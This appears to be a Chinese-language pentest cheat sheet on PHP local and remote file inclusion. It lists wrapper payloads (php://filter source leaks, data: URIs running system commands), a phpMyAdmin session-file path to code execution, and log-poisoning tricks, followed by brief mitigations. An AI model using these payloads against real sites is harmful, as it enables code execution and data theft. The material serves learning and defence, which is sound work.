# File Inclusion  
直接將包含文件作為xxx數據流來解析，場景就是攻擊者能控包含文件的變量  
常見危險函式：  
PHP: `include()`, `include_once()`, `require()`, `require_once()`, `fopen()`, `readfile()`  
JSP: `java.io.FileReader()`  
ASP: `includefile`  
php包含一個文件，會將該文件內容當作php代碼執行，因此不受檔名類型影響。  

# LFI  
能夠打開本地文件  

# RFI  
包含遠程文件，危害較大，但條件更嚴苛  
`php.ini`中設置  
1. allow_url_fopen = on (default: on)  
2. allow_url_include = on (default: off)  

# 包含手勢  
1. php偽協議  
```php
php://input
// 條件：allow_url_include = on
?file=php://input
POST data: xxx

php://filter
// 爆源碼
?file=php://filter/read=convert.base64-encode/resource=file.php

phar://path.zip/file.php
// php5.3.0up, 解析壓縮檔案

zip://path.zip%23file.php
// php5.3.0up, 功能與phar://一樣, 但需要指定絕對路徑, 而且要將#編碼成%23

data:URL schema
// php5.2up, php.ini中兩個設置都要on
?file=data:text/plain,<?php phpinfo();?>
?file=data:text/plain,<?php system(ls);?>
?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b (base64編碼phpinfo)
```  
2. include session  
session內容可控，session路徑已知...  
session路徑可以透過phpinfo中`session_save_path`得知  
常見存放位置：  
```php
/var/lib/php/sess_xxxxx
/var/lib/php/sessions/sess_xxxx
/tmp/sess_xxxxxx
/tmp/sessions/sess_xxxxx
```  
實際案例：  
phpmyadmin從LFI漏洞到RCE  
```php
xxx/phpmyadmin/index.php?target=xxx.php%253F/../../../../../var/lib/php/sessions/sess_xxxxxx
```  
3. include log  
log是否可讀  
以apache為例，request會被寫入`access.log`，錯誤就寫入`error.log`，默認儲存在`/var/log/apache2/`  
所以應用場景先透過配置文件得到路徑，還需要注意請求會不會被編碼，可以透過burp修改再送出，最後再包含log即可  
4. include ssh log  
是否可讀？  
默認路徑在`/var/log/auth.log`  
```php
ssh '<?php phpinfo();?>'@remotehost
// phpinfo代碼會出現在log裡，在進行include就好
```  
5. include environ  
6. include fd  
7. include temp file  
8. include uploaded file  

# 防禦手勢  
稍微總結一下上面的條件，可以得到下面mitigation的手法  
* php `open_basedir`  
* read permission  
* 過濾危險字符
